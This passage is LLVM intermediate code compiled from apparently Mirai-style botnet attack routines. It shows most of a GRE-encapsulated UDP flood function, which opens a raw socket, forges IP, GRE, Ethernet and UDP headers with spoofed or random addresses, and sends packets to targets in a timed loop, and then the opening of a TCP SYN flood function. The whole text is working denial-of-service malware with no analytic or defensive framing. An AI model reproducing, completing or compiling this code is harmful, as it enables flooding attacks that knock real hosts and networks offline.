  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 19, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %5
  br label %490

; <label>:95:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %96 = load i32, i32* %12, align 4
  %97 = bitcast i32* %11 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %95
  %101 = load i32, i32* %12, align 4
  %102 = call i32 @close(i32 %101)
  br label %490

; <label>:103:                                    ; preds = %95
  store i32 0, i32* %11, align 4
  br label %104

; <label>:104:                                    ; preds = %260, %103
  %105 = load i32, i32* %11, align 4
  %106 = load i8, i8* %7, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp slt i32 %105, %107
  br i1 %108, label %109, label %263

; <label>:109:                                    ; preds = %104
  %110 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %111 = load i8**, i8*** %13, align 8
  %112 = load i32, i32* %11, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8*, i8** %111, i64 %113
  store i8* %110, i8** %114, align 8
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  %119 = load i8*, i8** %118, align 8
  %120 = bitcast i8* %119 to %struct.iphdr*
  store %struct.iphdr* %120, %struct.iphdr** %25, align 8
  %121 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %122 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %121, i64 1
  %123 = bitcast %struct.iphdr* %122 to %struct.grehdr*
  store %struct.grehdr* %123, %struct.grehdr** %26, align 8
  %124 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %125 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %124, i64 1
  %126 = bitcast %struct.grehdr* %125 to %struct.ethhdr*
  store %struct.ethhdr* %126, %struct.ethhdr** %27, align 8
  %127 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %128 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %127, i64 1
  %129 = bitcast %struct.ethhdr* %128 to %struct.iphdr*
  store %struct.iphdr* %129, %struct.iphdr** %28, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i64 1
  %132 = bitcast %struct.iphdr* %131 to %struct.udphdr*
  store %struct.udphdr* %132, %struct.udphdr** %29, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = and i8 %135, 15
  %137 = or i8 %136, 64
  store i8 %137, i8* %134, align 4
  %138 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %139 = bitcast %struct.iphdr* %138 to i8*
  %140 = load i8, i8* %139, align 4
  %141 = and i8 %140, -16
  %142 = or i8 %141, 5
  store i8 %142, i8* %139, align 4
  %143 = load i8, i8* %14, align 1
  %144 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 1
  store i8 %143, i8* %145, align 1
  %146 = load i32, i32* %20, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 66, %147
  %149 = trunc i64 %148 to i16
  %150 = call zeroext i16 @htons(i16 zeroext %149) #7
  %151 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i16, i16* %15, align 2
  %154 = call zeroext i16 @htons(i16 zeroext %153) #7
  %155 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 3
  store i16 %154, i16* %156, align 4
  %157 = load i8, i8* %16, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 5
  store i8 %157, i8* %159, align 4
  %160 = load i8, i8* %17, align 1
  %161 = icmp ne i8 %160, 0
  br i1 %161, label %162, label %166

; <label>:162:                                    ; preds = %109
  %163 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %164 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 4
  store i16 %163, i16* %165, align 2
  br label %166

; <label>:166:                                    ; preds = %162, %109
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 6
  store i8 47, i8* %168, align 1
  %169 = load i32, i32* %23, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 8
  store i32 %169, i32* %171, align 4
  %172 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  %177 = load i32, i32* %176, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 9
  store i32 %177, i32* %179, align 4
  %180 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %181 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %182 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %181, i32 0, i32 1
  store i16 %180, i16* %182, align 2
  %183 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %184 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %185 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %184, i32 0, i32 2
  store i16 %183, i16* %185, align 1
  %186 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, 15
  %190 = or i8 %189, 64
  store i8 %190, i8* %187, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %192 = bitcast %struct.iphdr* %191 to i8*
  %193 = load i8, i8* %192, align 4
  %194 = and i8 %193, -16
  %195 = or i8 %194, 5
  store i8 %195, i8* %192, align 4
  %196 = load i8, i8* %14, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 1
  store i8 %196, i8* %198, align 1
  %199 = load i32, i32* %20, align 4
  %200 = sext i32 %199 to i64
  %201 = add i64 28, %200
  %202 = trunc i64 %201 to i16
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 2
  store i16 %203, i16* %205, align 2
  %206 = load i16, i16* %15, align 2
  %207 = zext i16 %206 to i32
  %208 = xor i32 %207, -1
  %209 = trunc i32 %208 to i16
  %210 = call zeroext i16 @htons(i16 zeroext %209) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 3
  store i16 %210, i16* %212, align 4
  %213 = load i8, i8* %16, align 1
  %214 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 5
  store i8 %213, i8* %215, align 4
  %216 = load i8, i8* %17, align 1
  %217 = icmp ne i8 %216, 0
  br i1 %217, label %218, label %222

; <label>:218:                                    ; preds = %166
  %219 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %220 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 4
  store i16 %219, i16* %221, align 2
  br label %222

; <label>:222:                                    ; preds = %218, %166
  %223 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 6
  store i8 17, i8* %224, align 1
  %225 = call i32 @rand_next()
  %226 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 8
  store i32 %225, i32* %227, align 4
  %228 = load i8, i8* %22, align 1
  %229 = icmp ne i8 %228, 0
  br i1 %229, label %230, label %236

; <label>:230:                                    ; preds = %222
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 9
  %233 = load i32, i32* %232, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  br label %244

; <label>:236:                                    ; preds = %222
  %237 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 8
  %239 = load i32, i32* %238, align 4
  %240 = sub i32 %239, 1024
  %241 = xor i32 %240, -1
  %242 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 9
  store i32 %241, i32* %243, align 4
  br label %244

; <label>:244:                                    ; preds = %236, %230
  %245 = load i16, i16* %18, align 2
  %246 = call zeroext i16 @htons(i16 zeroext %245) #7
  %247 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 0
  store i16 %246, i16* %248, align 2
  %249 = load i16, i16* %19, align 2
  %250 = call zeroext i16 @htons(i16 zeroext %249) #7
  %251 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 1
  store i16 %250, i16* %252, align 2
  %253 = load i32, i32* %20, align 4
  %254 = sext i32 %253 to i64
  %255 = add i64 8, %254
  %256 = trunc i64 %255 to i16
  %257 = call zeroext i16 @htons(i16 zeroext %256) #7
  %258 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 2
  store i16 %257, i16* %259, align 2
  br label %260

; <label>:260:                                    ; preds = %244
  %261 = load i32, i32* %11, align 4
  %262 = add nsw i32 %261, 1
  store i32 %262, i32* %11, align 4
  br label %104

; <label>:263:                                    ; preds = %104
  br label %264

; <label>:264:                                    ; preds = %489, %263
  store i32 0, i32* %11, align 4
  br label %265

; <label>:265:                                    ; preds = %480, %264
  %266 = load i32, i32* %11, align 4
  %267 = load i8, i8* %7, align 1
  %268 = zext i8 %267 to i32
  %269 = icmp slt i32 %266, %268
  br i1 %269, label %270, label %483

; <label>:270:                                    ; preds = %265
  %271 = load i8**, i8*** %13, align 8
  %272 = load i32, i32* %11, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds i8*, i8** %271, i64 %273
  %275 = load i8*, i8** %274, align 8
  store i8* %275, i8** %33, align 8
  %276 = load i8*, i8** %33, align 8
  %277 = bitcast i8* %276 to %struct.iphdr*
  store %struct.iphdr* %277, %struct.iphdr** %34, align 8
  %278 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i64 1
  %280 = bitcast %struct.iphdr* %279 to %struct.grehdr*
  store %struct.grehdr* %280, %struct.grehdr** %35, align 8
  %281 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %282 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %281, i64 1
  %283 = bitcast %struct.grehdr* %282 to %struct.ethhdr*
  store %struct.ethhdr* %283, %struct.ethhdr** %36, align 8
  %284 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %285 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %284, i64 1
  %286 = bitcast %struct.ethhdr* %285 to %struct.iphdr*
  store %struct.iphdr* %286, %struct.iphdr** %37, align 8
  %287 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i64 1
  %289 = bitcast %struct.iphdr* %288 to %struct.udphdr*
  store %struct.udphdr* %289, %struct.udphdr** %38, align 8
  %290 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %291 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %290, i64 1
  %292 = bitcast %struct.udphdr* %291 to i8*
  store i8* %292, i8** %39, align 8
  %293 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i32 0, i32 2
  %298 = load i8, i8* %297, align 4
  %299 = zext i8 %298 to i32
  %300 = icmp slt i32 %299, 32
  br i1 %300, label %301, label %322

; <label>:301:                                    ; preds = %270
  %302 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %303 = load i32, i32* %11, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i32 0, i32 1
  %307 = load i32, i32* %306, align 4
  %308 = call i32 @ntohl(i32 %307) #7
  %309 = call i32 @rand_next()
  %310 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %311 = load i32, i32* %11, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 2
  %315 = load i8, i8* %314, align 4
  %316 = zext i8 %315 to i32
  %317 = lshr i32 %309, %316
  %318 = add i32 %308, %317
  %319 = call i32 @htonl(i32 %318) #7
  %320 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  store i32 %319, i32* %321, align 4
  br label %322

; <label>:322:                                    ; preds = %301, %270
  %323 = load i32, i32* %23, align 4
  %324 = icmp eq i32 %323, -1
  br i1 %324, label %325, label %329

; <label>:325:                                    ; preds = %322
  %326 = call i32 @rand_next()
  %327 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 8
  store i32 %326, i32* %328, align 4
  br label %329

; <label>:329:                                    ; preds = %325, %322
  %330 = load i16, i16* %15, align 2
  %331 = zext i16 %330 to i32
  %332 = icmp eq i32 %331, 65535
  br i1 %332, label %333, label %348

; <label>:333:                                    ; preds = %329
  %334 = call i32 @rand_next()
  %335 = and i32 %334, 65535
  %336 = trunc i32 %335 to i16
  %337 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 3
  store i16 %336, i16* %338, align 4
  %339 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  %341 = load i16, i16* %340, align 4
  %342 = zext i16 %341 to i32
  %343 = sub nsw i32 %342, 1000
  %344 = xor i32 %343, -1
  %345 = trunc i32 %344 to i16
  %346 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %347 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %346, i32 0, i32 3
  store i16 %345, i16* %347, align 4
  br label %348

; <label>:348:                                    ; preds = %333, %329
  %349 = load i16, i16* %18, align 2
  %350 = zext i16 %349 to i32
  %351 = icmp eq i32 %350, 65535
  br i1 %351, label %352, label %358

; <label>:352:                                    ; preds = %348
  %353 = call i32 @rand_next()
  %354 = and i32 %353, 65535
  %355 = trunc i32 %354 to i16
  %356 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %357 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %356, i32 0, i32 0
  store i16 %355, i16* %357, align 2
  br label %358

; <label>:358:                                    ; preds = %352, %348
  %359 = load i16, i16* %19, align 2
  %360 = zext i16 %359 to i32
  %361 = icmp eq i32 %360, 65535
  br i1 %361, label %362, label %368

; <label>:362:                                    ; preds = %358
  %363 = call i32 @rand_next()
  %364 = and i32 %363, 65535
  %365 = trunc i32 %364 to i16
  %366 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %367 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %366, i32 0, i32 1
  store i16 %365, i16* %367, align 2
  br label %368

; <label>:368:                                    ; preds = %362, %358
  %369 = load i8, i8* %22, align 1
  %370 = icmp ne i8 %369, 0
  br i1 %370, label %375, label %371

; <label>:371:                                    ; preds = %368
  %372 = call i32 @rand_next()
  %373 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i32 0, i32 9
  store i32 %372, i32* %374, align 4
  br label %381

; <label>:375:                                    ; preds = %368
  %376 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 9
  %378 = load i32, i32* %377, align 4
  %379 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i32 0, i32 9
  store i32 %378, i32* %380, align 4
  br label %381

; <label>:381:                                    ; preds = %375, %371
  %382 = call i32 @rand_next()
  store i32 %382, i32* %40, align 4
  %383 = call i32 @rand_next()
  store i32 %383, i32* %41, align 4
  %384 = call i32 @rand_next()
  store i32 %384, i32* %42, align 4
  %385 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %386 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %385, i32 0, i32 0
  %387 = getelementptr inbounds [6 x i8], [6 x i8]* %386, i32 0, i32 0
  %388 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %387, i8* %388, i32 4)
  %389 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %390 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %389, i32 0, i32 1
  %391 = getelementptr inbounds [6 x i8], [6 x i8]* %390, i32 0, i32 0
  %392 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %391, i8* %392, i32 4)
  %393 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %394 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %393, i32 0, i32 0
  %395 = getelementptr inbounds [6 x i8], [6 x i8]* %394, i32 0, i32 0
  %396 = getelementptr inbounds i8, i8* %395, i64 4
  %397 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %396, i8* %397, i32 2)
  %398 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %399 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %398, i32 0, i32 1
  %400 = getelementptr inbounds [6 x i8], [6 x i8]* %399, i32 0, i32 0
  %401 = getelementptr inbounds i8, i8* %400, i64 4
  %402 = bitcast i32* %42 to i8*
  %403 = getelementptr inbounds i8, i8* %402, i64 2
  call void @util_memcpy(i8* %401, i8* %403, i32 2)
  %404 = load i8, i8* %21, align 1
  %405 = icmp ne i8 %404, 0
  br i1 %405, label %406, label %413

; <label>:406:                                    ; preds = %381
  %407 = load i8*, i8** %39, align 8
  %408 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %407, i32 %408)
  %409 = load i8*, i8** %39, align 8
  %410 = load i32, i32* %20, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds i8, i8* %409, i64 %411
  store i8 0, i8* %412, align 1
  br label %413

; <label>:413:                                    ; preds = %406, %381
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 0, i16* %415, align 2
  %416 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %417 = bitcast %struct.iphdr* %416 to i16*
  %418 = call zeroext i16 @checksum_generic(i16* %417, i32 20)
  %419 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 7
  store i16 %418, i16* %420, align 2
  %421 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 7
  store i16 0, i16* %422, align 2
  %423 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %424 = bitcast %struct.iphdr* %423 to i16*
  %425 = call zeroext i16 @checksum_generic(i16* %424, i32 20)
  %426 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %427 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %426, i32 0, i32 7
  store i16 %425, i16* %427, align 2
  %428 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 3
  store i16 0, i16* %429, align 2
  %430 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %431 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %432 = bitcast %struct.udphdr* %431 to i8*
  %433 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %434 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %433, i32 0, i32 2
  %435 = load i16, i16* %434, align 2
  %436 = load i32, i32* %20, align 4
  %437 = sext i32 %436 to i64
  %438 = add i64 8, %437
  %439 = trunc i64 %438 to i32
  %440 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %430, i8* %432, i16 zeroext %435, i32 %439)
  %441 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %442 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 2
  %443 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %444 = load i32, i32* %11, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %447, i32 0, i32 0
  store i16 2, i16* %448, align 4
  %449 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %450 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %449, i32 0, i32 9
  %451 = load i32, i32* %450, align 4
  %452 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %453 = load i32, i32* %11, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %452, i64 %454
  %456 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %455, i32 0, i32 0
  %457 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %456, i32 0, i32 2
  %458 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %457, i32 0, i32 0
  store i32 %451, i32* %458, align 4
  %459 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %460 = load i32, i32* %11, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %462, i32 0, i32 0
  %464 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %463, i32 0, i32 1
  store i16 0, i16* %464, align 2
  %465 = load i32, i32* %12, align 4
  %466 = load i8*, i8** %33, align 8
  %467 = load i32, i32* %20, align 4
  %468 = sext i32 %467 to i64
  %469 = add i64 66, %468
  %470 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %471 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %472 = load i32, i32* %11, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %471, i64 %473
  %475 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %474, i32 0, i32 0
  %476 = bitcast %struct.sockaddr_in* %475 to %struct.sockaddr*
  store %struct.sockaddr* %476, %struct.sockaddr** %470, align 8
  %477 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %478 = load %struct.sockaddr*, %struct.sockaddr** %477, align 8
  %479 = call i64 @sendto(i32 %465, i8* %466, i64 %469, i32 16384, %struct.sockaddr* %478, i32 16)
  br label %480

; <label>:480:                                    ; preds = %413
  %481 = load i32, i32* %11, align 4
  %482 = add nsw i32 %481, 1
  store i32 %482, i32* %11, align 4
  br label %265

; <label>:483:                                    ; preds = %265
  %484 = call i64 @time(i64* null) #6
  %485 = load i32, i32* %24, align 4
  %486 = sext i32 %485 to i64
  %487 = icmp sgt i64 %484, %486
  br i1 %487, label %488, label %489

; <label>:488:                                    ; preds = %483
  br label %490

; <label>:489:                                    ; preds = %483
  br label %264

; <label>:490:                                    ; preds = %488, %100, %94
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
